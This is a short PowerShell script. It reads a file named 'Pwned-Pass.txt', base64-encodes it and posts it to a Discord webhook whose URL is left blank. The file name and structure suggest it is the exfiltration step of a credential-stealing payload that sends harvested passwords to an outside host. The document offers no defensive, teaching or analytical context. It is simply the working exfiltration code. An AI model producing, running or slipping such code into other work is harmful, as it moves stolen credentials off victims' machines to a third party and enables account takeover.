# Define your Discord webhook URL
$webhookUrl = ""

# Path to the file you want to upload
$filePath = "Pwned-Pass.txt"

# Read the content of the file
$fileContent = Get-Content -Path $filePath -Raw

# Base64 encode the file content
$encodedFileContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))

# Create JSON payload
$jsonPayload = @{
    "content" = "Here's the file Pwned-Pass.txt:"
    "file" = @{
        "name" = "Pwned-Pass.txt"
        "content" = $encodedFileContent
    }
} | ConvertTo-Json

# Send the request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
